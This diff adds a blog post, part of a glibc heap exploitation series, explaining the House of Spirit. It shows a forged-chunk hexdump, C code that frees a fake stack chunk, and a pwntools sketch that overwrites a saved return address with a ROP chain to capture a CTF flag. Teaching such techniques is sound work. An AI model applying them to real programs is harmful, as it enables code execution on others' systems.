@@ -1,0 +1,178 @@
+<!doctype html>
+<html lang="en" data-mode="dark" data-crt="on">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<script>(function(){try{var d=document.documentElement,m=localStorage.getItem('sf.mode');if(!m)m=matchMedia('(prefers-color-scheme: light)').matches?'light':'dark';d.setAttribute('data-mode',m);if(localStorage.getItem('sf.crt')==='on')d.setAttribute('data-crt','on');}catch(e){}})();</script>
+<title>the House of Spirit — algoatson.github.io</title>
+<meta name="description" content="Part 7 — instead of corrupting a real chunk, you forge a fake one in memory you already control and trick free() into filing it away. The next malloc hands it right back, so you get malloc to return the stack.">
+<meta name="author" content="your name here">
+<link rel="canonical" href="https://algoatson.github.io/p/house-of-spirit/">
+<meta property="og:type" content="article">
+<meta property="og:title" content="the House of Spirit — algoatson.github.io">
+<meta property="og:description" content="Part 7 — instead of corrupting a real chunk, you forge a fake one in memory you already control and trick free() into filing it away. The next malloc hands it right back, so you get malloc to return the stack.">
+<meta property="og:url" content="https://algoatson.github.io/p/house-of-spirit/">
+<meta property="og:site_name" content="algoatson.github.io">
+<meta property="og:image" content="https://algoatson.github.io/assets/og/house-of-spirit.png"><meta name="twitter:card" content="summary_large_image">
+<link rel="icon" type="image/svg+xml" href="/assets/favicon.svg">
+<link rel="alternate" type="application/rss+xml" title="algoatson.github.io" href="/feed.xml">
+<link rel="stylesheet" href="/assets/style.css">
+<link rel="stylesheet" href="/assets/pygments.css">
+<script type="application/ld+json">{"@context": "https://schema.org", "@type": "Article", "headline": "the House of Spirit", "datePublished": "2026-06-14", "dateModified": "2026-06-14", "author": {"@type": "Person", "name": "your name here"}, "publisher": {"@type": "Person", "name": "segfault"}, "description": "Part 7 — instead of corrupting a real chunk, you forge a fake one in memory you already control and trick free() into filing it away. The next malloc hands it right back, so you get malloc to return the stack.", "url": "https://algoatson.github.io/p/house-of-spirit/", "mainEntityOfPage": "https://algoatson.github.io/p/house-of-spirit/", "keywords": "heap, pwn, glibc"}</script></head>
+<body>
+<a class="skip" href="#main">skip to content</a>
+<div class="progress" aria-hidden="true"></div>
+<div class="wrap">
+  <div class="frame">
+    <span class="frame__legend"><a href="/">algoatson.github.io</a></span>
+    <span class="frame__addr">~/posts</span>
+
+    <header class="bar">
+      <span class="bar__prompt">&#10095; <b>segfault</b>@algoatson.github.io</span>
+      <nav class="nav" aria-label="primary"><a href="/about/">whoami</a><a href="/" aria-current="page">posts</a><a href="/tags/">tags</a></nav>
+      <button class="searchbtn" data-open="search" type="button">grep<kbd>/</kbd></button>
+    </header>
+
+    <main class="main" id="main">
+<a class="backlink" href="/">back to index</a>
+<header class="posthead">
+  <h1>the House of Spirit</h1>
+  <div class="meta"><span>2026-06-14</span><span>4 min read</span><a class="tag" href="/tags/heap/">heap</a> <a class="tag" href="/tags/pwn/">pwn</a> <a class="tag" href="/tags/glibc/">glibc</a></div>
+</header>
+<aside class="series" aria-label="series navigation"><div class="series__head"><span class="series__label">series</span><span class="series__name">glibc heap exploitation</span><span class="series__pos">part 7 of 9</span></div><ol class="series__list"><li><a href="/p/glibc-heap-internals/">the glibc heap, from the chunk up</a></li><li><a href="/p/house-of-force/">the House of Force</a></li><li><a href="/p/fastbin-dup/">fastbin dup</a></li><li><a href="/p/unsafe-unlink/">unsafe unlink (and the safe-unlink bypass)</a></li><li><a href="/p/the-unsorted-bin-attack/">the unsorted bin attack</a></li><li><a href="/p/tcache-poisoning-explained/">tcache poisoning, explained like you&#x27;ll have to use it</a></li><li class="cur" aria-current="true">the House of Spirit</li><li><a href="/p/poison-null-byte/">the poison null byte</a></li><li><a href="/p/the-house-of-orange/">the House of Orange</a></li></ol></aside>
+<div class="postwrap has-toc">
+  <aside class="toc" aria-label="table of contents"><span class="toctitle">contents</span><div class="toc">
+<ul>
+<li><a href="#the-idea">the idea</a></li>
+<li><a href="#driving-it">driving it</a></li>
+<li><a href="#the-stack-payoff">the stack payoff</a></li>
+<li><a href="#limitations">limitations</a></li>
+</ul>
+</div>
+</aside>
+  <article class="prose"><p>Every technique so far corrupted a <em>real</em> chunk. The House of Spirit flips it: you
+build a <strong>fake</strong> chunk in memory you already control — the stack, a global, a
+larger heap buffer — and convince <code class="highlight">free()</code> to file it into a bin. The next request
+of that size hands your fake chunk straight back, so you've made <code class="highlight">malloc</code> return an
+address it should never return. Point that at a saved return address and the heap
+becomes a stack write.</p>
+<figure class="target"><figcaption><span class="t-label">target</span><span class="t-file">./spirit</span></figcaption><div class="target__grid"><dl class="target__facts"><div><dt>arch</dt><dd>amd64-64-little</dd></div><div><dt>libc</dt><dd>2.31</dd></div><div><dt>technique</dt><dd>free() a forged chunk -&gt; malloc returns attacker-chosen memory</dd></div><div><dt>requires</dt><dd>free() on a pointer you influence + somewhere writable to forge a chunk</dd></div></dl></div></figure>
+<h2 id="the-idea">the idea<a class="headerlink" href="#the-idea" title="Permanent link">#</a></h2>
+<p><code class="highlight">free(p)</code> doesn't care whether <code class="highlight">p</code> came from <code class="highlight">malloc</code> — it reads the size field at
+<code class="highlight">p - 0x10</code>, decides which bin it belongs in, and links it there. So if you can make
+a program <code class="highlight">free</code> a pointer into a buffer you control, and you've laid out a valid
+chunk header there, that buffer becomes a free chunk. Allocate that size again and
+it comes back to you.</p>
+<p>The fake chunk only has to survive a couple of sanity checks. For a fastbin-sized
+fake:</p>
+<ol>
+<li>the <strong>size</strong> must be a valid fastbin size and <code class="highlight">0x10</code>-aligned;</li>
+<li>the chunk <em>after</em> it (at <code class="highlight">fake + size</code>) must itself have a <strong>plausible size</strong> —
+   between <code class="highlight">0x20</code> and the arena's <code class="highlight">system_mem</code> — or <code class="highlight">free</code> aborts with
+   <code class="highlight">free(): invalid next size</code>.</li>
+</ol>
+<p>So you forge <em>two</em> size fields: your chunk's, and a believable one for its
+"successor."</p>
+<figure class="codeblock hexdump"><figcaption><span class="fname">a fake 0x40 fastbin chunk forged on the stack</span><span class="lang">hex</span><button class="copy" type="button" aria-label="copy hexdump">copy</button></figcaption><div class="hx"><pre><span class="off">00000000</span>  00 00 00 00 00 00 00 00  <mark>41</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark> <mark>00</mark>  <span class="asc">|........<mark>A</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark><mark>.</mark>|</span>
+<span class="off">00000010</span>  00 00 00 00 00 00 00 00  00 00 00 00 00 00 00 00  <span class="asc">|................|</span>
+<span class="off">00000020</span>  00 00 00 00 00 00 00 00  41 00 00 00 00 00 00 00  <span class="asc">|........A.......|</span></pre></div></figure>
+<p>(First <code class="highlight">0x41</code> = the fake chunk's size — <code class="highlight">0x40 | PREV_INUSE</code>. The second <code class="highlight">0x41</code>,
+<code class="highlight">0x40</code> bytes later, is the "next chunk" size that passes the next-size check.)</p>
+<h2 id="driving-it">driving it<a class="headerlink" href="#driving-it" title="Permanent link">#</a></h2>
+<figure class="codeblock"><figcaption><span class="fname">spirit.c — the victim hands you a free() on a controlled pointer</span><span class="lang">c</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-1">1</a></span>
+<span class="normal"><a href="#spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-2">2</a></span>
+<span class="normal"><a href="#spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-3">3</a></span>
+<span class="normal"><a href="#spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-4">4</a></span>
+<span class="normal"><a href="#spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-5">5</a></span>
+<span class="normal"><a href="#spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-6">6</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-1"><span class="kt">uint64_t</span><span class="w"> </span><span class="n">fake</span><span class="p">[</span><span class="mi">16</span><span class="p">];</span>
+</span><span id="spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-2"><span class="n">fake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x41</span><span class="p">;</span><span class="w">                 </span><span class="c1">// fake chunk size  (chunk starts at &amp;fake[0])</span>
+</span><span id="spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-3"><span class="n">fake</span><span class="p">[</span><span class="mi">9</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x41</span><span class="p">;</span><span class="w">                 </span><span class="c1">// next chunk&#39;s size, to pass the check</span>
+</span><span id="spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-4">
+</span><span id="spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-5"><span class="n">free</span><span class="p">(</span><span class="o">&amp;</span><span class="n">fake</span><span class="p">[</span><span class="mi">2</span><span class="p">]);</span><span class="w">                 </span><span class="c1">// free the *user data* pointer -&gt; fake chunk into the 0x40 tcache/fastbin</span>
+</span><span id="spiritc-the-victim-hands-you-a-free-on-a-controlled-pointer-6"><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">p</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">malloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">);</span><span class="w">         </span><span class="c1">// ...handed straight back: p == &amp;fake[2]</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<p>In a real target you rarely call <code class="highlight">free(&amp;fake)</code> yourself — you get there by
+overwriting a stored pointer the program later frees, or via a type confusion. The
+point is the same: <strong>a <code class="highlight">free</code> you steer + a chunk you forge = <code class="highlight">malloc</code> returning
+your address.</strong></p>
+<h2 id="the-stack-payoff">the stack payoff<a class="headerlink" href="#the-stack-payoff" title="Permanent link">#</a></h2>
+<p>Forge the fake chunk <em>on the stack</em>, straddling a saved return address. After the
+free→malloc round-trip you're handed a write primitive pointed at the stack:</p>
+<figure class="codeblock"><figcaption><span class="fname">spirit.py</span><span class="lang">python</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#spiritpy-1">1</a></span>
+<span class="normal"><a href="#spiritpy-2">2</a></span>
+<span class="normal"><a href="#spiritpy-3">3</a></span>
+<span class="normal"><a href="#spiritpy-4">4</a></span>
+<span class="normal"><a href="#spiritpy-5">5</a></span>
+<span class="normal"><a href="#spiritpy-6">6</a></span>
+<span class="normal"><a href="#spiritpy-7">7</a></span>
+<span class="normal"><a href="#spiritpy-8">8</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="spiritpy-1"><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+</span><span id="spiritpy-2"><span class="n">io</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">&quot;./spirit&quot;</span><span class="p">)</span>
+</span><span id="spiritpy-3"><span class="c1"># leak a stack address + the canary, lay a fake 0x40 chunk over the saved RIP slot,</span>
+</span><span id="spiritpy-4"><span class="c1"># steer a free() onto it, then re-allocate it:</span>
+</span><span id="spiritpy-5"><span class="hll"><span class="n">forge_fake_chunk</span><span class="p">(</span><span class="n">stack_leak</span><span class="p">)</span>        <span class="c1"># size 0x41 + a plausible next size</span>
+</span></span><span id="spiritpy-6"><span class="hll"><span class="n">trigger_free</span><span class="p">(</span><span class="n">stack_leak</span> <span class="o">+</span> <span class="mh">0x10</span><span class="p">)</span>     <span class="c1"># free the fake -&gt; tcache[0x40]</span>
+</span></span><span id="spiritpy-7"><span class="n">buf</span> <span class="o">=</span> <span class="n">alloc</span><span class="p">(</span><span class="mh">0x30</span><span class="p">)</span>                   <span class="c1"># == the fake chunk, on the stack</span>
+</span><span id="spiritpy-8"><span class="n">edit</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">canary</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">rbp</span><span class="p">)</span> <span class="o">+</span> <span class="n">rop_chain</span><span class="p">)</span>   <span class="c1"># overwrite saved RIP</span>
+</span></code></pre></div></td></tr></table></div>
+</figure>
+<details class="spoiler">
+<summary>the shell</summary>
+<p>The forged chunk overlaps the saved return address; one write drops a ROP chain
+(or a one-gadget) over RIP, and the function returns into it:
+<figure class="codeblock"><figcaption><span class="lang">txt</span><span class="capbtns"><button class="nums" type="button" data-toggle="nums" aria-pressed="true" aria-label="toggle line numbers" title="toggle line numbers">#</button><button class="copy" type="button" aria-label="copy code">copy</button></span></figcaption><div class="highlight"><table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span class="normal"><a href="#code-1">1</a></span></pre></div></td><td class="code"><div><pre><span></span><code><span id="code-1">segfault{m4ll0c_r3turn3d_th3_st4ck}
+</span></code></pre></div></td></tr></table></div>
+</figure></p>
+</details>
+<div class="admonition tip">
+<p class="admonition-title">the tcache makes this trivial</p>
+<p>On glibc ≥ 2.26 a fastbin-sized <code class="highlight">free</code> hits the <strong>tcache</strong> first, and the tcache
+skips the <code class="highlight">invalid next size</code> check entirely — so the tcache House of Spirit
+only needs a valid, aligned <em>size</em> field, not a believable successor. That's why
+forging a chunk and freeing it is one of the most reliable modern primitives
+once you have any <code class="highlight">free</code>-a-pointer-you-control bug.</p>
+</div>
+<h2 id="limitations">limitations<a class="headerlink" href="#limitations" title="Permanent link">#</a></h2>
+<ul>
+<li>you need a <code class="highlight">free</code> on a pointer you influence (the whole premise),</li>
+<li>the fake chunk's size must match a real bin and (≥ 2.32) be <code class="highlight">0x10</code>-aligned,</li>
+<li>the fastbin variant needs that believable next-size field.</li>
+</ul>
+<p>It pairs naturally with the earlier moves: forge the chunk, free it, then
+<a href="/p/tcache-poisoning-explained/">poison the tcache</a> from the duplicate. Next:
+<a href="/p/poison-null-byte/">the poison null byte</a>, where a single stray <code class="highlight">\x00</code> is enough
+to make two chunks overlap.</p></article>
+</div>
+<section class="related"><span class="related__title">related</span><div class="listing"><a class="row" href="/p/poison-null-byte/"><span class="row__date">2026-06-14</span><span class="row__tag">heap</span><span class="row__title">the poison null byte</span><span class="row__min">3 min</span></a><a class="row" href="/p/the-house-of-orange/"><span class="row__date">2026-06-14</span><span class="row__tag">heap</span><span class="row__title">the House of Orange</span><span class="row__min">4 min</span></a><a class="row" href="/p/the-unsorted-bin-attack/"><span class="row__date">2026-06-13</span><span class="row__tag">heap</span><span class="row__title">the unsorted bin attack</span><span class="row__min">4 min</span></a></div></section>
+<nav class="pager"><span></span><a class="next" href="/p/poison-null-byte/"><span class="lbl">older &#8250;</span>the poison null byte</a></nav></main>
+
+    <footer class="status">
+      <span>23 posts</span>
+      <span class="shade">&#9617;&#9618;&#9619;</span>
+      <span>no trackers · no cookies · no js required to read · copying is encouraged</span>
+      <span class="right">
+        <a href="https://github.com/algoatson">github</a><a href="https://twitter.com/yourname">twitter</a><a href="mailto:you@segfault.sh">email</a>
+        <button class="toggle" data-toggle="mode" type="button">[light]</button>
+        <button class="toggle" data-toggle="crt" type="button">[crt]</button>
+        <a href="/feed.xml">[rss]</a>
+      </span>
+    </footer>
+  </div>
+</div>
+
+<div class="palette-mask" role="dialog" aria-modal="true" aria-label="search">
+  <div class="palette">
+    <div class="palette__count">grep<span class="n">0/0</span><span class="rule"></span>posts</div>
+    <div class="palette__input"><span class="sigil">&gt;</span><input type="text"
+       placeholder="fuzzy search title + body…" autocomplete="off" spellcheck="false" aria-label="search query"></div>
+    <div class="palette__results"></div>
+    <div class="palette__hint"><span><kbd>↑↓</kbd>/<kbd>^j ^k</kbd> move</span><span><kbd>⏎</kbd> open</span><span><kbd>esc</kbd> close</span></div>
+  </div>
+</div>
+<div class="help-mask" role="dialog" aria-modal="true" aria-label="keyboard shortcuts">
+  <div class="help"><h3>keys</h3><dl><dt><kbd>/</kbd></dt><dd>search</dd><dt><kbd>j / k</kbd></dt><dd>move / scroll</dd><dt><kbd>enter</kbd></dt><dd>open</dd><dt><kbd>g g / G</kbd></dt><dd>top / bottom</dd><dt><kbd>t</kbd></dt><dd>toggle light</dd><dt><kbd>?</kbd></dt><dd>this help</dd><dt><kbd>esc</kbd></dt><dd>close</dd></dl></div>
+</div>
+<script src="/assets/search-index.js"></script>
+<script src="/assets/app.js" defer></script>
+</body>
+</html>
